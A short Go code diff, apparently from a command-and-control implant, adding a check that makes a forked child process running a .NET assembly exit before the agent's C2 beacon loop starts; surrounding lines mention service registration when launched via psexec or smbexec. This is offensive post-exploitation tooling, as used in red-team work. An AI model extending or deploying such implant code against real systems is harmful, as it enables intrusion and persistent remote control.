@@ -7,6 +7,13 @@ import (
 )
 
 func Main() {
+	// Detect fork-and-run CLR child mode (set by forkRunAssembly in parent).
+	// Must be checked before any agent initialisation — the child only runs
+	// one assembly and exits; it must NOT start the C2 beacon loop.
+	if clrChildDetect() {
+		return
+	}
+
 	// If started by the Windows Service Control Manager (e.g. via psexec/smbexec),
 	// register as a service and report SERVICE_RUNNING so SCM doesn't kill us
 	// after the 30-second startup timeout.
